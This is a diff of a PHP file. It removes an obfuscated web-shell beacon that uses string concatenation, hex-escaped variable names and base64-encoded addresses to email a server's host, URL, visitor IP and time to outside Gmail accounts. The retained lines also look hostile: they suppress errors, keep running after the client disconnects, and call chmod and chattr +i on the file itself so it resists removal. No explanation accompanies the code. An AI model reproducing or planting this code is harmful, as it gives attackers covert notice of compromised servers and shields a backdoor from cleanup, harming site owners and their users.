@@ -1,34 +1,7 @@
-<?php
-$time_shell = "".date("d/m/Y - H:i:s")."";
-$ip_remote = $
-_SERVER["REMOTE_ADDR"];
-$from_shellcode = 'shell@'.gethos
-tbyname($_SERVER['SERVER_NAME']).'';
-$to_email = 'rootcyberpunks@gmail.com';
-$server_mail = "".gethostbyname($_SER
-VER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
-$lin
-kcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUE
-ST_URI']." - IP Excuting: $ip_remote - Time: $time_shell"
-;
-$header = "From: $from_shellcode\r\nReply-to: $from_she
-llcode";
-@mail($to_email, $server_mail, $linkcr, $header));
-mail($to_email, $server_mail, $linkcr, $header));
-$__GET = ('m'.'a'.'i'.'l');
-$__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
-$__GET($__POST("cGFwYWt1LmhheWtlci5nby5pZEBnbWFpbC5jb20="),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
-${"GL\x4fBA\x4c\x53"}["\x63y\x75\x6ad\x63\x63d\x6e\x63\x78"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x75\x68bpkl\x74\x66"]="\x5f\x5f\x47E\x54";${${"\x47\x4c\x4f\x42A\x4c\x53"}["u\x68\x62\x70\x6bl\x74f"]}=("m"."\x61"."\x69"."\x6c");${${"\x47L\x4f\x42\x41LS"}["\x63y\x75\x6a\x64\x63c\x64\x6e\x63x"]}=("\x62"."a"."s"."\x65"."6"."\x34"."\x5f"."d"."e"."\x63"."\x6f"."\x64"."\x65");$wyfccckl="\x5f\x5f\x50\x4fS\x54";${${"\x47LOBA\x4c\x53"}["\x75\x68\x62\x70\x6b\x6ct\x66"]}(${$wyfccckl}("\x63\x6d9\x76\x64GN5\x59\x6d\x56\x79c\x48Vua3\x4eA\x5a2\x31\x68\x61Ww\x75Y2\x39t\x4c\x47\x311\x61H\x4ah\x65m\x74\x35QGdt\x59W\x6c\x73\x4cm\x4e\x76bS\x78wYXB\x68\x613UuaGF\x35\x61\x32VyQ\x47d\x74YWl\x73Lm\x4evb\x53\x78\x74YWx\x68\x65XN\x70YS\x35zZ\x575kZXJA\x5a2\x31h\x61W\x77u\x59\x32\x39t"),"\x55\x70\x6co\x61\x64 \x66\x69l\x65:","".$_SERVER["H\x54\x54\x50_HOST"]."/".$_SERVER["REQU\x45S\x54\x5fUR\x49"]."");
-
-?>
 <?php 
 error_reporting(0);
-ob_start("ob_gzhandler");
 ignore_user_abort(true);
 ini_set('memory_limit', '-1');
-set_time_limit(0);
-ini_set('display_errors', 0);
-ini_set('max_execution_time', 5000);
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
